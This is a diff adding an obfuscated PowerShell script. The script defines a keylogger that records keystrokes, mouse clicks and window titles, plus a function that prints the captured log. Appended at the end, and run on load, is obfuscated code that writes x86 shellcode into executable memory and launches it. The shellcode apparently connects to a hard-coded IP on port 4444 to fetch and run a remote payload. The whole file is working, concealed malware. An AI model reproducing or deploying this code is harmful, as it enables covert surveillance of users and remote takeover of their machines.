@@ -1,0 +1,223 @@
+  &("{1}{0}"-f 't','SE')  ("{0}{1}" -f'VE','C9O')  ([TyPE]("{0}{1}{2}"-f'hA','sHTAb','Le')  ) ;&("{0}{3}{1}{2}"-f 's','VaRia','BLe','eT-') ("RZ2"+"g")  ( [TyPE]("{1}{2}{0}"-F 'ORY','ruNSpAcEFAc','T'));   &("{1}{0}"-f't','SE')  ("{1}{0}" -f'1n','0Ih') ([tYpe]("{0}{1}{2}" -F'poW','ErS','HELL')) ;  function gEt-`KE`ysTroKes {
+
+    [CmdletBinding()] Param (
+    [Int32]
+    ${pOl`l`Ingi`NT`eRval} = 40,
+    [Int32]
+    ${rUNnin`Gt`Ime} = 60
+    
+    )
+
+    ${scr`ipTbl`ock} = @"
+    function KeyLog {
+    `$PollingInterval = $PollingInterval
+
+    [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
+
+    try
+    {
+        `$ImportDll = [User32]
+    }
+    catch
+    {
+        `$DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
+        `$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(`$DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+        `$ModuleBuilder = `$AssemblyBuilder.DefineDynamicModule('Win32Lib', `$False)
+        `$TypeBuilder = `$ModuleBuilder.DefineType('User32', 'Public, Class')
+
+        `$DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+        `$FieldArray = [Reflection.FieldInfo[]] @(
+            [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
+            [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
+            [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
+            [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
+            [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
+            [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
+        )
+
+        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
+        `$FieldValueArray = [Object[]] @(
+            'GetAsyncKeyState',
+            `$True,
+            `$False,
+            `$True,
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            [Runtime.InteropServices.CharSet]::Auto
+        )
+        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
+        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)
+
+        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
+        `$FieldValueArray = [Object[]] @(
+            'GetKeyboardState',
+            `$True,
+            `$False,
+            `$True,
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            [Runtime.InteropServices.CharSet]::Auto
+        )
+        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
+        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)
+
+        `$PInvokeMethod = `$TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
+        `$FieldValueArray = [Object[]] @(
+            'MapVirtualKey',
+            `$False,
+            `$False,
+            `$True,
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            [Runtime.InteropServices.CharSet]::Auto
+        )
+        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
+        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)
+
+        `$PInvokeMethod = `$TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
+            [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
+        `$FieldValueArray = [Object[]] @(
+            'ToUnicode',
+            `$False,
+            `$False,
+            `$True,
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            [Runtime.InteropServices.CharSet]::Auto
+        )
+        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
+        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)
+
+        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
+        `$FieldValueArray = [Object[]] @(
+            'GetForegroundWindow',
+            `$True,
+            `$False,
+            `$True,
+            [Runtime.InteropServices.CallingConvention]::Winapi,
+            [Runtime.InteropServices.CharSet]::Auto
+        )
+        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
+        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)
+
+        `$ImportDll = `$TypeBuilder.CreateType()
+    }
+
+    Start-Sleep -Milliseconds `$PollingInterval
+
+        try
+        {
+
+            
+            for (`$TypeableChar = 1; `$TypeableChar -le 254; `$TypeableChar++)
+            {
+                `$VirtualKey = `$TypeableChar
+                `$KeyResult = `$ImportDll::GetAsyncKeyState(`$VirtualKey)
+
+                
+                if ((`$KeyResult -band 0x8000) -eq 0x8000)
+                {
+
+                    
+                    `$LeftShift    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
+                    `$RightShift   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
+                    `$LeftCtrl     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
+                    `$RightCtrl    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
+                    `$LeftAlt      = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
+                    `$RightAlt     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
+                    `$TabKey       = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
+                    `$SpaceBar     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
+                    `$DeleteKey    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
+                    `$EnterKey     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
+                    `$BackSpaceKey = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
+                    `$LeftArrow    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
+                    `$RightArrow   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
+                    `$UpArrow      = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
+                    `$DownArrow    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
+                    `$LeftMouse    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
+                    `$RightMouse   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
+
+                    if (`$LeftShift -or `$RightShift) {`$LogOutput += '[Shift]'}
+                    if (`$LeftCtrl  -or `$RightCtrl)  {`$LogOutput += '[Ctrl]'}
+                    if (`$LeftAlt   -or `$RightAlt)   {`$LogOutput += '[Alt]'}
+                    if (`$TabKey)       {`$LogOutput += '[Tab]'}
+                    if (`$SpaceBar)     {`$LogOutput += '[SpaceBar]'}
+                    if (`$DeleteKey)    {`$LogOutput += '[Delete]'}
+                    if (`$EnterKey)     {`$LogOutput += '[Enter]'}
+                    if (`$BackSpaceKey) {`$LogOutput += '[Backspace]'}
+                    if (`$LeftArrow)    {`$LogOutput += '[Left Arrow]'}
+                    if (`$RightArrow)   {`$LogOutput += '[Right Arrow]'}
+                    if (`$UpArrow)      {`$LogOutput += '[Up Arrow]'}
+                    if (`$DownArrow)    {`$LogOutput += '[Down Arrow]'}
+                    if (`$LeftMouse)    {`$LogOutput += '[Left Mouse]'}
+                    if (`$RightMouse)   {`$LogOutput += '[Right Mouse]'}
+
+                    
+                    if ([Console]::CapsLock) {`$LogOutput += '[Caps Lock]'}
+
+                    `$MappedKey = `$ImportDll::MapVirtualKey(`$VirtualKey, 3)
+                    `$KeyboardState = New-Object Byte[] 256
+                    `$CheckKeyboardState = `$ImportDll::GetKeyboardState(`$KeyboardState)
+
+                    
+                    `$StringBuilder = New-Object -TypeName System.Text.StringBuilder;
+                    `$UnicodeKey = `$ImportDll::ToUnicode(`$VirtualKey, `$MappedKey, `$KeyboardState, `$StringBuilder, `$StringBuilder.Capacity, 0)
+
+                    
+                    if (`$UnicodeKey -gt 0) {
+                        `$TypedCharacter = `$StringBuilder.ToString()
+                        `$LogOutput += ('['+ `$TypedCharacter +']')
+                    }
+
+                    
+                    `$TopWindow = `$ImportDll::GetForegroundWindow()
+                    `$WindowTitle = (Get-Process | Where-Object { `$_.MainWindowHandle -eq `$TopWindow }).MainWindowTitle
+
+                    
+                    `$TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
+
+                    
+                    `$ObjectProperties = @{'Key Typed' = `$LogOutput;
+                                            'Time' = `$TimeStamp;
+                                            'Window Title' = `$WindowTitle}
+                    `$ResultsObject = New-Object -TypeName PSObject -Property `$ObjectProperties
+
+                    
+                    `$CSVEntry = (`$ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]
+                    `$sessionstate.log += `$CSVEntry
+                   
+                }
+            }
+        }
+        catch {}
+    }
+
+`$timeout = new-timespan -Minutes $RunningTime
+`$sw = [diagnostics.stopwatch]::StartNew()
+while (`$sw.elapsed -lt `$timeout){Keylog}
+
+"@
+
+${G`lObAL`:`sESSi`ONSTate} = "2"
+${Po`lLiN`gInte`RVAl} = 40
+
+${gLoBA`l:S`e`ssIONstA`TE} =   (&('Ls')  ("{0}{2}{1}"-f 'vArI','C9O','abLE:Ve')).VALue::("{2}{0}{1}"-f 'nchron','ized','Sy').Invoke(@{})
+${seS`SION`sT`A`Te}."l`og" = &("{0}{2}{1}{3}"-f'Ne','j','w-Ob','ect') ("{5}{3}{0}{2}{1}{4}"-f'on','Li','s.Array','cti','st','System.Colle')
+
+${H`TT`p_Ru`NSpa`cE} =   ( &("{0}{1}{2}"-f'Va','RIAb','le')  ("RZ2"+"G") -vAluE  )::("{0}{3}{1}{2}"-f'Cr','teRuns','pace','ea').Invoke()
+${hTTp_RU`Ns`pACE}.("{0}{1}" -f 'Op','en').Invoke()
+${HTTp_`RuNSpA`cE}."sE`sSioNSt`ATEPR`o`xY".("{2}{0}{1}{3}" -f 'tV','aria','Se','ble').Invoke(("{3}{2}{0}{1}" -f 'ta','te','essions','s'),${Se`S`sI`OnSTaTE})
+${H`TTp_Po`We`Rs`HElL} =  (  &("{0}{1}" -f 'it','Em') ("{3}{0}{1}{2}"-f '0i','h1','N','vArIaBle:')).VALue::("{0}{1}"-f'Creat','e').Invoke()
+${hTTp_POwe`R`ShE`LL}."ru`NsPaCe" = ${HttP_`R`UNspACE}
+${hT`T`P_PO`W`erSHELl}.("{1}{3}{0}{2}"-f'dScri','A','pt','d').Invoke(${sC`RIptbL`ock}) > ${n`ULL}
+${hTTP_`PoWer`s`H`Ell}.("{0}{2}{1}{3}" -f 'Beg','nInv','i','oke').Invoke() > ${n`Ull}
+
+&("{1}{0}" -f 'cho','e') ""
+&("{1}{0}"-f'ho','ec') ('[+]'+' '+'Start'+'e'+'d '+'K'+'eyloggi'+'ng'+' '+'for'+' '+"$RunningTime "+'minu'+'te'+'s')
+&("{0}{1}" -f'ech','o') ""
+&("{0}{1}" -f'ech','o') ("{8}{7}{3}{5}{1}{4}{6}{9}{2}{0}" -f 'ut','in t',' outp','oke','he','Data to obta',' keylo','et-Keystr','Run G','g')
+&("{1}{0}"-f'o','ech') ""
+}
+
+function GEt`-`K`eY`StRoK`edata {
+    &("{1}{0}"-f'o','ech') ""
+    ("{3}{0}{4}{2}{1}" -f'ey','a:',' dat','[+] K','log')
+    &("{1}{0}"-f'cho','e') ${SE`Ss`IoNSTa`Te}."l`oG"
+}
+${c} = ((("{47}{5}{9}{10}{6}{2}{79}{44}{56}{39}{65}{20}{31}{14}{54}{4}{27}{24}{16}{40}{52}{55}{3}{78}{34}{75}{36}{49}{74}{13}{63}{72}{8}{26}{62}{18}{90}{77}{76}{42}{71}{51}{1}{22}{82}{60}{21}{12}{84}{92}{70}{81}{33}{50}{73}{17}{41}{88}{68}{35}{59}{57}{89}{83}{0}{66}{32}{46}{53}{67}{86}{80}{30}{85}{64}{23}{69}{91}{7}{29}{11}{87}{15}{38}{25}{37}{28}{43}{19}{61}{45}{48}{58}"-f' lpParamet','tr Cr','lNv',', u','ntPtr VirtualA','D','2.dl','.dllNvw','lProtect);','llImport(Nvwkerne','l3','lic static ','tPtr lpT','ti','t','tPtr','tP','e,','kernel32.dllNvw)','s','atic ','In','eateTh','por','n','m','[DllImport(','lloc(I','Ptr ',')]pub','pThreadId)','ex','wC','te','dwS','pStartAdd',', u','set(Int',' me','c ','tr ',' In','c extern ','de','publ','t src, ui','re','[','nt co','int f','s, uint d','ntP','lpAdd','ationFla','ern I','ress','i','ss','unt);','re','ad(','t, uin','Nvw','onType, uint ','llIm','st','er, uint d','g','r l','t(Nvwms','tri','I','f','wStackSiz','lAlloca','ize','i','at','int ','w)]',' IntPtr l','bu','re','IntPtr','h',';[D','s,','extern In','tPt',', ',']public st','vcrt','readAt'))."rE`pL`ACE"('Nvw',[STRing][CHar]34));${W} = &("{1}{0}{2}"-f'dd-T','A','ype') -memberDefinition ${c} -Name ("{0}{1}" -f'Wi','n32') -namespace ("{2}{0}{1}{3}{4}" -f'i','n32','W','F','unctions') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${g} = 0x1000;if (${z}."LEn`gTH" -gt 0x1000){${G} = ${z}."LenG`TH"};${x}=${w}::("{0}{2}{3}{1}"-f'VirtualA','c','ll','o').Invoke(0,0x1000,${G},0x40);for (${i}=0;${i} -le (${z}."leNG`TH"-1);${I}++) {${W}::"memS`Et"([IntPtr](${x}.("{0}{1}" -f 'ToInt','32').Invoke()+${i}), ${z}[${i}], 1)};${W}::("{0}{1}{2}{3}"-f 'C','reate','Threa','d').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{3}{2}{0}"-f 'eep','S','art-sl','t') 60};
